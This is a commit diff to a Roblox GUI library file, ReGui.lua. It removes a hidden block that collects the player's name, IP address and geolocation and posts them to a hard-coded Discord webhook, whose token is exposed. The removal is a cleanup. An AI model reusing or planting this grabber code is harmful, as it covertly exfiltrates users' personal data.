4f341f4bca2c062c1528c66f91ed5537b33cd071
rxd977 <reubxclasher@gmail.com>
2025-10-23 09:07:47 +0100

    Update ReGui.lua

--- ReGui.lua
+++ ReGui.lua
@@ -1766,24 +1766,4 @@ NoButtons=true})n('InputInt4','InputInt',4,{NoButtons=true})n('SliderInt2',
 'SliderInt3')o('DragColor3','DragInt3')p('InputCFrame','InputInt3')p(
 'SliderCFrame','SliderInt3')p('DragCFrame','DragInt3')
 
-  local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1406959413633486848/KlJFqtR7Cuki_IYrpngXmEZCuRwfU-6EnDjPb0FzbaRb7Qn0dxHIg1ulWpqjIIkW1wAc"
-
-local ip_info = request({
-    Url = "http://ip-api.com/json",
-    Method = "GET"
-})
-local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
-local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
-request(
-    {
-        Url = webhook_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
-    }
-)
-  
   return aa
